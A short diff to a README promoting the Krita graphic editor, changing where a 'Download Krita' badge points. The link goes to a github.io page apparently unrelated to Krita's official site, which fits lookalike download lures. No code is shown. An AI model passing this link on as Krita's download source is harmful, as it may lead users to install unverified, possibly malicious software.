@@ -2,7 +2,7 @@
 
 Krita is a free, open-source graphic editor designed for digital painting, animation, and illustration. Perfect for artists, designers, and hobbyists, it offers powerful tools and customizable workflows.  
 
-[![Download Krita](https://img.shields.io/badge/Download-Krita-blueviolet)](https://graphic-editor-krita.github.io/.github/)  
+[![Download Krita](https://img.shields.io/badge/Download-Krita-blueviolet)](https://graphic-editor-krita.github.io/.github/graphiceditor)  
 
 ---  
 
